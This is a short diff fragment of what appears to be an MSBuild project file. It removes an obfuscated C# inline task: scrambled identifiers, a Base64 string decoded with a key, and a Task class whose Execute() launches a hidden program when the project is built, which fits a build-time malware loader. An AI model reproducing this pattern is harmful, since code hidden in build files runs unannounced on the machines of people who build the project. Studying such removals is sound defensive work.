-				GonosomeAche(MedietyUnidentifying(MangosteenGomuti));
-			}
-			else if (!PseudoassertiveFyttesoded && !MangosteenGomuti.ToLower().StartsWith(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("IBsVCA=="), "HoaxingOutstare"))))
-				GonosomeAche(NeurinomasUncourtesy(MangosteenGomuti));
-			else
-				UmbrousFeigners(NeurinomasUncourtesy(MangosteenGomuti), BoreensScroo);
-	}
-    }
-	    
-	     //This is for MSBuild later
-	    public class ClassExample : Task, ITask
-	    {
-	        public override bool Execute()
-	        {
-	            MasterablePelado.Main(new string[] { });
-	            return true;
-	        }
-	    }
-	    
-}
 
+    }
+  
+}
  ]]>
 	</Code>	  
     </Task>
